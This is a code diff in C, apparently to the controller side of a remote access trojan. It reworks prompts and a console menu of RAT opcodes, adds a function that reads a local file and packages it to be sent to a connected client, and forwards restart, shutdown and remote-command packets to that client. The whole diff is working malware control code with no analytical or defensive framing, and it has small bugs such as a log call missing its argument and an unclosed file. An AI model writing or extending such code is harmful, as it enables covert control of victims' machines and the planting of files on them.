@@ -56,7 +56,7 @@ static SOCKET accept_client(SOCKET server) {
 }
 
 static void *read_ratpacket(ratpacket_t *p) {
-  printf("enter opcode: \n");
+  puts("enter opcode:");
 #define _(s, v, n) printf("%d. %s\n", ((v) + 1), n);
   FOREACH_RAT_OPCODE
 #undef _
@@ -64,14 +64,14 @@ static void *read_ratpacket(ratpacket_t *p) {
     return NULL;
   }
   p->op = atoi((char *)p) - 1;
-  printf("enter data: ");
+  puts("enter data:");
   fgets((char *)p->data, DEFAULT_BUFLEN - sizeof(*p), stdin);
   p->data_len = strlen((char *)p->data) + 1;
   return p;
 }
 
 static void read_alert(ratpacket_t *p) {
-  alert_t *alert = (alert_t *) &p->data;
+  alert_t *alert = (alert_t *)&p->data;
   puts("enter title:");
   fgets(alert->title, sizeof(alert->title), stdin);
   puts("enter text:");
@@ -80,6 +80,46 @@ static void read_alert(ratpacket_t *p) {
   char num_buf[9 + 2]; // max int len
   fgets(num_buf, sizeof(num_buf), stdin);
   alert->amount = atoi(num_buf);
+}
+
+static ratpacket_t *read_file_entry() {
+  ratpacket_t *p = NULL;
+  FILE *f;
+  char name[256];
+  puts("enter file path:");
+  fgets(name, sizeof(name), stdin);
+  int path_len = strlen(name);
+  if (name[path_len - 1] == '\n')
+    name[path_len - 1] = '\0';
+  if (fopen_s(&f, name, "rb")) {
+    LOG_DEBUG("read path %s failed");
+    return p;
+  }
+  puts("enter client file name:");
+  fgets(name, sizeof(name), stdin);
+  int name_len = strlen(name);
+  if (name[name_len - 1] == '\n') {
+    name[name_len - 1] = '\0';
+  } else
+    ++name_len;
+  fseek(f, 0, SEEK_END);
+  int file_size = ftell(f);
+  fseek(f, 0, SEEK_SET);
+  p = malloc(sizeof(*p) + name_len + file_size);
+  if (!p) {
+    LOG_DEBUG("malloc failed");
+    return p;
+  }
+  p->op = RAT_PACKET_FILE;
+  p->data_len = file_size + name_len;
+  memcpy(p->data, name, name_len);
+  int read_result = fread(p->data + name_len, 1, file_size, f);
+  if (read_result != file_size) {
+    free(p);
+    LOG_DEBUG("fread expected %d bytes but got %d", file_size, read_result);
+    return NULL;
+  }
+  return p;
 }
 
 static void handle_client(SOCKET client) {
@@ -124,10 +164,18 @@ static void handle_client(SOCKET client) {
       }
       printf("%s", pc->data);
       break;
+    case RAT_PACKET_RESTART:
+    case RAT_PACKET_SHUTDOWN:
+    case RAT_PACKET_CMD:
+      if (send(client, (char *)ps, sizeof(*ps) + ps->data_len, 0) ==
+          SOCKET_ERROR) {
+        LOG_ERR("send failed with %d", WSAGetLastError());
+      }
+      break;
     case RAT_PACKET_ALERT:
       ps->data_len = sizeof(alert_t);
       read_alert(ps);
-      alert_t *alert = (alert_t*)ps->data;
+      alert_t *alert = (alert_t *)ps->data;
       LOG_DEBUG("received alert title=\"%s\" text\"%s\" amount=\"%d\"",
                 alert->title, alert->text, alert->amount);
       if (send(client, (char *)ps, sizeof(*ps) + ps->data_len, 0) ==
@@ -135,6 +183,21 @@ static void handle_client(SOCKET client) {
         LOG_ERR("send failed with %d", WSAGetLastError());
         break;
       }
+      break;
+    case RAT_PACKET_FILE:
+      ps = read_file_entry();
+      if (!ps) {
+        LOG_ERR("read file entry failed");
+        break;
+      }
+      int send_result = send(client, (char *)ps, sizeof(*ps) + ps->data_len, 0);
+      if (send_result == SOCKET_ERROR) {
+        LOG_ERR("send failed with %d", WSAGetLastError());
+      } else {
+        LOG_DEBUG("sent file entry with size %d", ps->data_len);
+      }
+      free(ps);
+      ps = (ratpacket_t *)bufs;
       break;
     default:
       LOG_DEBUG("unimplemented opcode %s (%d)", rat_opcode_to_str(ps->op),
